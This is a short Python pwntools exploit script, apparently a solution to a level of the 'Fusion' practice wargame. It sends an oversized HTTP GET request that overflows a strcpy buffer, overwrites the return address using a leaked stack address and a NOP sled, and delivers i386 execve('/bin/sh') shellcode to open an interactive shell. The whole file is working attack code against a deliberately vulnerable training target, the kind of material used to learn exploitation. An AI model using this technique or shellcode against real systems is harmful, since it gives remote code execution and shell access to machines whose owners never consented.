#!/usr/bin/python3
# ssh fusion@127.0.0.1 -p 2222
from pwn import *
context.arch = 'i386'
c = remote('fusion', 20000)
s = c.recvline().decode('utf-8')
print(s)
# strcpy doesnt check bounds
address = p32(int(s[21:32], 16)+158)
print(address)
payload = b'GET '+b'A'*127+b'\x90'*12
payload += address
payload += b' HTTP/1.1' + b"\x90"*16
payload += b'"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80'
c.sendline(payload)
c.interactive()
